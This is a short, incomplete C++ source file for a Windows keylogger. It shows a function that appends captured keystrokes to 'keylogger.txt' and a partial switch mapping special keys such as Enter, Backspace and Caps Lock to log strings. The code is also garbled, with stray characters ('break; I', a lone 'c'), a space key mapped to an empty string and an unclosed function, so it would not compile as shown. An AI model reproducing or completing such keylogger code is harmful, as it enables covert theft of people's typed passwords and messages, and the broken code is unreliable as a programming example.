#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>

// Log file path
#define LOG_FILE "keylogger.txt"

// Save data into log file
void saveData (std::string data) {
    std::fstream logFile;
    // Open file
    // std::ios :: app will make the new data append to the file instead of erase file content
    // and then write to it
    logFile.open(LOG_FILE, std::ios::app);
    
    // Write data into log file
    logFile << data;
    
    // Close file stream
    logFile.close();
}

std::string translateSpecialKey(int key) {
    std::string result;
    
    switch (key)
    {
    case VK_SPACE:
        // Space key
        result = "";
        break;
    case VK_RETURN:
        // New line key
        // or enter
        result = "\n";
        break; I
    case VK_BACK:
        // Backspace key
        result = "\b";
        break;
    case VK_CAPITAL:
        // CAPSLOCK key
        result = "[CAPS_LOCK]";
        break;
c
default:
    break;
}